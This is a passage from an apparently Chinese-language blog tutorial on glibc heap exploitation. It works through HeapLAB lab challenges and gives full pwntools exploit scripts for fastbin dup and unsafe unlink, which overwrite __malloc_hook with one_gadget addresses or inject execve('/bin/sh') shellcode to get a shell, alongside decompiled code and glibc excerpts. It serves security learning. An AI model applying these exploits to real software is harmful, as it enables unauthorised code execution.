# Index of allocated chunks.
index = 0

# Select the &quot;malloc&quot; option; send size &amp; data.
# Returns chunk index.
def malloc(size, data):
    global index
    io.send(b&quot;1&quot;)
    io.sendafter(b&quot;size: &quot;, f&quot;{size}&quot;.encode())
    io.sendafter(b&quot;data: &quot;, data)
    io.recvuntil(b&quot;&gt; &quot;)
    index += 1
    return index - 1

# Select the &quot;free&quot; option; send index.
def free(index):
    io.send(b&quot;2&quot;)
    io.sendafter(b&quot;index: &quot;, f&quot;{index}&quot;.encode())
    io.recvuntil(b&quot;&gt; &quot;)

io = start()

# This binary leaks the address of puts(), use it to resolve the libc load address.
io.recvuntil(b&quot;puts() @ &quot;)
libc.address = int(io.recvline(), 16) - libc.sym.puts
io.timeout = 0.1

# =============================================================================

# =-=-=- EXAMPLE -=-=-=

# Set the username field.
username = b&quot;ferity-fan&quot;
io.sendafter(b&quot;username: &quot;, username)
io.recvuntil(b&quot;&gt; &quot;)

# Request two 0x30-sized chunks and fill them with data.
chunk_A = malloc(0x68, b&quot;A&quot;*0x28)
chunk_B = malloc(0x68, b&quot;B&quot;*0x28)

# Free the first chunk, then the second.
free(chunk_A)
free(chunk_B)
free(chunk_A)

# modify fd
malloc(0x68, p64(libc.sym.__malloc_hook - 35))

# malloc twice
malloc(0x68, b&#39;0&#39;)
malloc(0x68, b&#39;1&#39;)

# malloc fake chunk
# if no limit malloc&#39;s count
# malloc(0x68, p8(0)*0x13+p64(libc.sym.system))
# sh_addr = p64(next(libc.search(b&#39;/bin/sh\x00&#39;)))

# malloc(sh_addr, b&quot;&quot;)
one = [0xc4dbf, 0xc4de6, 0xe1fa1]
malloc(0x68, p8(0)*0x13+p64(libc.address + one[2]))
malloc(0x10, b&#39;&#39;)
# =============================================================================

io.interactive()
</code></pre>
<h4 id="示例二：fastbin-dup-2"><a href="#示例二：fastbin-dup-2" class="headerlink" title="示例二：fastbin_dup_2"></a>示例二：fastbin_dup_2</h4><blockquote>
<p>文件详见附件 <a href="attachment/fastbin_dup_2/fastbin_dup_2">fastbin_dup_2</a></p>
</blockquote>
<h5 id="检查安全措施-3"><a href="#检查安全措施-3" class="headerlink" title="检查安全措施"></a>检查安全措施</h5><pre><code class="sh">┌──(fanya㉿ferity)-[~/…/heap/heaplab/part1/challenge-fastbin_dup]
└─$ checksec fastbin_dup_2 
[*] &#39;/home/fanya/Desktop/heap/heaplab/part1/challenge-fastbin_dup/fastbin_dup_2&#39;
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
    RUNPATH:  &#39;../.glibc/glibc_2.30_no-tcache&#39;
</code></pre>
<h5 id="程序分析-3"><a href="#程序分析-3" class="headerlink" title="程序分析"></a>程序分析</h5><p>没有限制double free，但此时的chunk申请不了0x68的大小也就意味着我们不能直接利用那个<code>__malloc_hook - 35</code>的位置了。但是我们知道<code>main_arena</code>上存着各种fastbin的fd指针，可以使用两次fastbin dup，一次用来写 size字段，一次用来写fd字段，此时的fd字段是main_arena上的某个位置（要与伪造的size相对应），接着malloc来覆盖至top_chunk的地址，修改至<code>__malloc_hook - 35 </code>的位置，此时继续malloc适当的大小即可覆盖至<code>__malloc_hook</code>，将其覆盖为one_gadget的地址。但是我们发现此时的寄存器状态并不满足任何一个one_gadget所需要的条件，不过经我们调试发现相应的位置存着是我们之前输入的值，将其修改为<code>-s\x00</code>即可。</p>
<pre><code class="c">int __cdecl __noreturn main(int argc, const char **argv, const char **envp)
{
  unsigned __int64 num; // rax
  unsigned int index; // [rsp+14h] [rbp-7Ch]
  size_t n; // [rsp+18h] [rbp-78h]
  unsigned __int64 na; // [rsp+18h] [rbp-78h]
  char *m_array[13]; // [rsp+20h] [rbp-70h] BYREF
  unsigned __int64 v8; // [rsp+88h] [rbp-8h]

  v8 = __readfsqword(0x28u);
  setvbuf(_bss_start, 0LL, 2, 0LL);
  puts(&quot;\n===============&quot;);
  puts(&quot;|   HeapLAB   |  CHALLENGE: Fastbin Dup&quot;);
  puts(&quot;===============\n&quot;);
  printf(&quot;puts() @ %p\n&quot;, &amp;puts);
  memset(m_array, 0, sizeof(m_array));
  index = 0;
  while ( 1 )
  {
    while ( 1 )
    {
      printf(&quot;\n1) malloc %u/%u\n&quot;, index, 13LL);
      puts(&quot;2) free&quot;);
      puts(&quot;3) quit&quot;);
      printf(&quot;&gt; &quot;);
      num = read_num();
      if ( num != 2 )
        break;
      printf(&quot;index: &quot;);
      na = read_num();
      if ( na &gt;= index )
        puts(&quot;invalid index&quot;);
      else
        free(m_array[na]);
    }
    if ( num == 3 )
      break;
    if ( num == 1 )
    {
      if ( index &gt; 0xC )
      {
        puts(&quot;maximum requests reached&quot;);
      }
      else
      {
        printf(&quot;size: &quot;);
        n = read_num();
        if ( n &gt; 0x58 &amp;&amp; (n &lt;= 0x68 || n &gt; 0x78) )
        {
          puts(&quot;fast chunks only (excluding 0x70)&quot;);
        }
        else
        {
          m_array[index] = (char *)malloc(n);
          if ( m_array[index] )
          {
            printf(&quot;data: &quot;);
            read(0, m_array[index++], n);
          }
          else
          {
            puts(&quot;request failed&quot;);
          }
        }
      }
    }
  }
  exit(0);
}
</code></pre>
<h5 id="漏洞利用-2"><a href="#漏洞利用-2" class="headerlink" title="漏洞利用"></a>漏洞利用</h5><ul>
<li><p>两次fastbin dup，伪造一个size字段以及一个fd字段</p>
<p><img src="Heap.assets/image-20220821113749445.png" alt="image-20220821113749445"></p>
</li>
<li><p>继续malloc，将top chunk的地址覆盖，为了方便观看我们将其修改为0xdeadbeef</p>
<p><img src="Heap.assets/image-20220821114003739.png" alt="image-20220821114003739"></p>
<p>为了满足一个对size字段的检查，我们还是用<code>__malloc_hook - 35</code>来覆盖top_chunk的地址。</p>
<pre><code class="c">--- a/malloc/malloc.c
+++ b/malloc/malloc.c
@@ -4076,6 +4076,9 @@ _int_malloc (mstate av, size_t bytes)
       victim = av-&gt;top;
       size = chunksize (victim);
 
+      if (__glibc_unlikely (size &gt; av-&gt;system_mem))
+        malloc_printerr (&quot;malloc(): corrupted top size&quot;);
+
       if ((unsigned long) (size) &gt;= (unsigned long) (nb + MINSIZE))
         {
           remainder_size = size - nb;
</code></pre>
</li>
<li><p>继续malloc，使用one_gadget来覆盖<code>__malloc_hook</code>，为了方便观察，我们仍然使用0xdeadbeef来代替</p>
<p><img src="Heap.assets/image-20220821115406447.png" alt="image-20220821115406447"></p>
<p>继续malloc，观察是否满足one_gadget的条件</p>
<p><img src="Heap.assets/image-20220821115524129.png" alt="image-20220821115524129"></p>
<p>此时的寄存器状态</p>
<p><img src="Heap.assets/image-20220821115602029.png" alt="image-20220821115602029"></p>
<p>此时的栈帧状态</p>
<p><img src="Heap.assets/image-20220821115655834.png" alt="stck"></p>
<p>可以观察到并不满足任何一个one_gadget的地址，但是我们看到第三个one_gadget，只要求rsp+0x50的位置所存的值为0即可，此时的值我们发现是可以有我们自己控制的，遂修改即可。</p>
</li>
<li><p>drop a shell</p>
<p><img src="Heap.assets/image-20220821120333916.png" alt="image-20220821120333916"></p>
</li>
</ul>
<h5 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h5><pre><code class="python">#!/usr/bin/python3
from pwn import *

elf = context.binary = ELF(&quot;fastbin_dup_2&quot;)
libc = ELF(elf.runpath + b&quot;/libc.so.6&quot;) # elf.libc broke again

gs = &#39;&#39;&#39;
continue
&#39;&#39;&#39;
def start():
    if args.GDB:
        return gdb.debug(elf.path, gdbscript=gs)
    else:
        return process(elf.path)

# Index of allocated chunks.
index = 0

# Select the &quot;malloc&quot; option; send size &amp; data.
# Returns chunk index.
def malloc(size, data):
    global index
    io.send(b&quot;1&quot;)
    io.sendafter(b&quot;size: &quot;, f&quot;{size}&quot;.encode())
    io.sendafter(b&quot;data: &quot;, data)
    io.recvuntil(b&quot;&gt; &quot;)
    index += 1
    return index - 1

# Select the &quot;free&quot; option; send index.
def free(index):
    io.send(b&quot;2&quot;)
    io.sendafter(b&quot;index: &quot;, f&quot;{index}&quot;.encode())
    io.recvuntil(b&quot;&gt; &quot;)

io = start()

# This binary leaks the address of puts(), use it to resolve the libc load address.
io.recvuntil(b&quot;puts() @ &quot;)
libc.address = int(io.recvline(), 16) - libc.sym.puts
io.timeout = 0.1

# =============================================================================

# =-=-=- EXAMPLE -=-=-=

# Request two 0x50-sized chunks.
chunk_A = malloc(0x48, b&quot;A&quot;*8)
chunk_B = malloc(0x48, b&quot;B&quot;*8)

# Free the first chunk, then the second.
free(chunk_A)
free(chunk_B)
free(chunk_A)

malloc(0x48, p64(0x61))
malloc(0x48, b&quot;C&quot;*0x48)
malloc(0x48, b&quot;D&quot;*0x48)

# other fastbin dup
chunk_E = malloc(0x58, b&quot;E&quot;*0x58)
chunk_F = malloc(0x58, b&quot;F&quot;*0x58)

free(chunk_E)
free(chunk_F)
free(chunk_E)

malloc(0x58, p64(libc.sym.main_arena + 0x20))
# malloc(0x58, b&quot;G&quot;*0x58)
malloc(0x58, b&quot;-s\x00&quot;)
malloc(0x58, b&quot;H&quot;*0x58)

# over_write the top_chunk
malloc(0x58, b&quot;Y&quot;*0x30 + p64(libc.sym.__malloc_hook - 35))
# malloc(0x58, b&quot;Y&quot;*0x30 + p64(0xdeadbeef))

# malloc fake chunk
malloc(0x28, b&quot;Z&quot;*0x13 + p64(libc.address + 0xe1fa1))
# malloc(0x28, b&quot;Z&quot;*0x13 + p64(0xdeadbeef))

# drop a shell
malloc(0x10, b&quot;&quot;)

# =============================================================================
io.interactive()                
</code></pre>
<h4 id="示例三：0CTF-2017-babyheap"><a href="#示例三：0CTF-2017-babyheap" class="headerlink" title="示例三：0CTF 2017 babyheap"></a>示例三：0CTF 2017 babyheap</h4><blockquote>
<p>文件详见<a href="attachment%5C0ctf_2017_babyheap%5Cbabyheap">babyheap</a></p>
</blockquote>
<h3 id="Unsafe-Unlink"><a href="#Unsafe-Unlink" class="headerlink" title="Unsafe Unlink"></a>Unsafe Unlink</h3><h4 id="详情-2"><a href="#详情-2" class="headerlink" title="详情"></a>详情</h4><p>为了避免堆内存过度碎片化，当一个堆块（fastbin chunk 除外）被释放时，libc会查看其前后堆块是否处于被释放的状态，如果是，就将前面或后面的堆块中从bins中取出，并于当前堆块合并，这个取出的过程便是unlink。</p>
<p>假设我们此时开辟了6个大小为0xa0的堆块：<img src="Heap.assets/image-20220903173420886.png" alt="image-20220903173420886"></p>
<p>此时我们释放靠近top chunk的堆块，我们会发现该堆块会和top chunk合并<img src="Heap.assets/image-20220903173447945.png" alt="image-20220903173447945"></p>
<p>此时我们释放第一个申请的块，我们可以看到这个块已被放入了unsortedbin，且fd,bk指针均被赋值，下一个chunk的prev_size及prev_inuse均有改变<img src="Heap.assets/image-20220903173735492.png" alt="image-20220903173735492"></p>
<p>此时我们再去释放临近块，我们会发现两个chunk合并成立一个chunk。</p>
<p><img src="Heap.assets/image-20220903174353252.png" alt="image-20220903174353252"></p>
<p><img src="Heap.assets/image-20220903175411826.png" alt="image-20220903175411826"></p>
<p>在这个unlink的过程中存在着一个fd,bk的反射写入，我们此漏洞的利用同样也是根据于此：</p>
<ul>
<li><p>我们先创建5个大小为0x90的堆块：<img src="Heap.assets/image-20220903181246083.png" alt="image-20220903181246083"></p>
</li>
<li><p>接着我们利用堆溢出来修改第三个堆块的fd, bk以及第四个堆块的prev_size，prev_inuse:<img src="Heap.assets/image-20220903182117957.png" alt="image-20220903182117957"></p>
</li>
<li><p>我们继续释放第四个块，此时第四个块的prev_inuse为0，也就意味着这个堆块会向前合并。</p>
<p><img src="Heap.assets/image-20220903182811281.png" alt="image-20220903182811281"></p>
</li>
</ul>
<p>unsafe unlink 相应代码如下：</p>
<pre><code class="c">#define unlink(AV, P, BK, FD) {\
    FD = P-&gt;fd;\
    BK = P-&gt;bk;\
    FD-&gt;bk = BK;\
    BK-&gt;fd = FD;\
    if (!in_smallbin_range (P-&gt;size)\
        &amp;&amp; __builtin_expect (P-&gt;fd_nextsize != NULL, 0)) {\
            if (FD-&gt;fd_nextsize == NULL) {\
                if (P-&gt;fd_nextsize == P)\
                  FD-&gt;fd_nextsize = FD-&gt;bk_nextsize = FD;\
                else {\
                    FD-&gt;fd_nextsize = P-&gt;fd_nextsize;\
                    FD-&gt;bk_nextsize = P-&gt;bk_nextsize;\
                    P-&gt;fd_nextsize-&gt;bk_nextsize = FD;\
                    P-&gt;bk_nextsize-&gt;fd_nextsize = FD;\
                }\
            } else {\
                P-&gt;fd_nextsize-&gt;bk_nextsize = P-&gt;bk_nextsize;\
                P-&gt;bk_nextsize-&gt;fd_nextsize = P-&gt;fd_nextsize;\
            }\
    }\
}
</code></pre>
<h4 id="限制"><a href="#限制" class="headerlink" title="限制"></a>限制</h4><p>这项技术只能在GLIBC版本&lt;=2.3.3的情况下使用，safe unlink  是在2004年GLIBC版本2.3.4中引入的，而GLIBC版本如此之老并不常见。这项技术最初是用来对付没有NX/DEP的平台的，这里也是这样描述的。2003年，AMD在他们的消费者桌面处理器中引入了硬件NX支持，随后英特尔在2004年也引入了，因此没有这种保护的系统并不常见。</p>
<h4 id="示例一-unsafe-unlink"><a href="#示例一-unsafe-unlink" class="headerlink" title="示例一 unsafe_unlink"></a>示例一 unsafe_unlink</h4><blockquote>
<p>文件详见 </p>
</blockquote>
<h5 id="检查保护措施"><a href="#检查保护措施" class="headerlink" title="检查保护措施"></a>检查保护措施</h5><pre><code class="bash">┌──(fanya㉿ferity)-[~/…/heap/heaplab/part1/unsafe_unlink]
└─$ checksec unsafe_unlink
[*] &#39;/home/fanya/Desktop/heap/heaplab/part1/unsafe_unlink/unsafe_unlink&#39;
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX disabled
    PIE:      PIE enabled
    RWX:      Has RWX segments
    RUNPATH:  &#39;../.glibc/glibc_2.23_unsafe-unlink&#39;
</code></pre>
<h5 id="exp-2"><a href="#exp-2" class="headerlink" title="exp"></a>exp</h5><pre><code class="python">#!/usr/bin/python3
from pwn import *

elf = context.binary = ELF(&quot;unsafe_unlink&quot;)
libc = ELF(elf.runpath + b&quot;/libc.so.6&quot;) # elf.libc broke again

gs = &#39;&#39;&#39;
continue
&#39;&#39;&#39;
def start():
    if args.GDB:
        return gdb.debug(elf.path, gdbscript=gs)
    else:
        return process(elf.path)

# Index of allocated chunks.
index = 0

# Select the &quot;malloc&quot; option; send size.
# Returns chunk index.
def malloc(size):
    global index
    io.send(b&quot;1&quot;)
    io.sendafter(b&quot;size: &quot;, f&quot;{size}&quot;.encode())
    io.recvuntil(b&quot;&gt; &quot;)
    index += 1
    return index - 1

# Select the &quot;edit&quot; option; send index &amp; data.
def edit(index, data):
    io.send(b&quot;2&quot;)
    io.sendafter(b&quot;index: &quot;, f&quot;{index}&quot;.encode())
    io.sendafter(b&quot;data: &quot;, data)
    io.recvuntil(b&quot;&gt; &quot;)

# Select the &quot;free&quot; option; send index.
def free(index):
    io.send(b&quot;3&quot;)
    io.sendafter(b&quot;index: &quot;, f&quot;{index}&quot;.encode())
    io.recvuntil(b&quot;&gt; &quot;)

io = start()

# This binary leaks the address of puts(), use it to resolve the libc load address.
io.recvuntil(b&quot;puts() @ &quot;)
libc.address = int(io.recvline(), 16) - libc.sym.puts

# This binary leaks the heap start address.
io.recvuntil(b&quot;heap @ &quot;)
heap = int(io.recvline(), 16)
io.recvuntil(b&quot;&gt; &quot;)
io.timeout = 0.1

# =============================================================================

# Prepare execve(&quot;/bin/sh&quot;) shellcode with a jmp over where the fd will be written.
shellcode = asm(&quot;jmp shellcode;&quot; + &quot;nop;&quot;*0x16 + &quot;shellcode:&quot; + shellcraft.execve(&quot;/bin/sh&quot;))

chunk_A = malloc(0x88)
chunk_B = malloc(0x88)

fd = libc.sym.__free_hook - 0x18
bk = heap + 0x20

edit(chunk_A, pack(fd) + pack(bk) + shellcode.ljust(0x70, b&#39;\x00&#39;) + p64(0x90)*2)
free(chunk_B)
free(chunk_A)

# =============================================================================

io.interactive()
</code></pre>
<h3 id="Safe-Unlink"><a href="#Safe-Unlink" class="headerlink" title="Safe Unlink"></a>Safe Unlink</h3><h3 id="Unsortedbin-Attack"><a href="#Unsortedbin-Attack" class="headerlink" title="Unsortedbin Attack"></a>Unsortedbin Attack</h3><h3 id="House-of-Orange"><a href="#House-of-Orange" class="headerlink" title="House of Orange"></a>House of Orange</h3><h3 id="House-of-Spirit"><a href="#House-of-Spirit" class="headerlink" title="House of Spirit"></a>House of Spirit</h3><h3 id="House-of-Lore"><a href="#House-of-Lore" class="headerlink" title="House of Lore"></a>House of Lore</h3><h3 id="House-of-Einherjar"><a href="#House-of-Einherjar" class="headerlink" title="House of Einherjar"></a>House of Einherjar</h3><h3 id="House-of-Rabbit"><a href="#House-of-Rabbit" class="headerlink" title="House of Rabbit"></a>House of Rabbit</h3><h3 id="Poison-Null-Byte"><a href="#Poison-Null-Byte" class="headerlink" title="Poison Null Byte"></a>Poison Null Byte</h3><h3 id="Tcache-Dup"><a href="#Tcache-Dup" class="headerlink" title="Tcache Dup"></a>Tcache Dup</h3><h3 id="House-of-Corrosion"><a href="#House-of-Corrosion" class="headerlink" title="House of Corrosion"></a>House of Corrosion</h3>